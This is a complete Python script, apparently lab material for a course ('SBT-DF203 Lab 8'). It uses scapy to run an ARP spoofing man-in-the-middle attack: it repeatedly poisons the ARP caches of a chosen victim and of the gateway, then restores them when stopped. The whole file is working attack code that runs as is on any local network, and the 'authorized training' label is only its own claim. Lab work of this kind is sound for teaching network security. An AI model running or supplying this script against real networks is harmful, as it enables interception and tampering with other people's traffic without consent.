#!/usr/bin/env python3
"""
Authorized training ARP spoofing script — SBT-DF203 Lab 8
Poisons the victim's ARP cache to associate the gateway IP with this host's MAC,
and the gateway's ARP cache to associate the victim IP with this host's MAC.
Usage: sudo python3 arp.py <victim_ip> <gateway_ip>
"""
import sys
import time
from scapy.all import ARP, send, getmacbyip

def get_mac(ip):
    mac = getmacbyip(ip)
    if mac is None:
        print(f"[!] Could not resolve MAC for {ip}")
        sys.exit(1)
    return mac

def spoof(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(dest_ip, source_ip, dest_mac, source_mac):
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: sudo python3 arp.py <victim_ip> <gateway_ip>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    print(f"[*] Victim: {victim_ip} ({victim_mac})")
    print(f"[*] Gateway: {gateway_ip} ({gateway_mac})")
    print("[*] Starting ARP spoofing. Press Ctrl+C to stop and restore.")

    try:
        sent_packets_count = 0
        while True:
            spoof(victim_ip, gateway_ip, victim_mac)
            spoof(gateway_ip, victim_ip, gateway_mac)
            sent_packets_count += 2
            print(f"\r[*] Packets sent: {sent_packets_count}", end="")
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP tables. Please wait...")
        restore(victim_ip, gateway_ip, victim_mac, gateway_mac)
        restore(gateway_ip, victim_ip, gateway_mac, victim_mac)
        print("[*] ARP tables restored.")
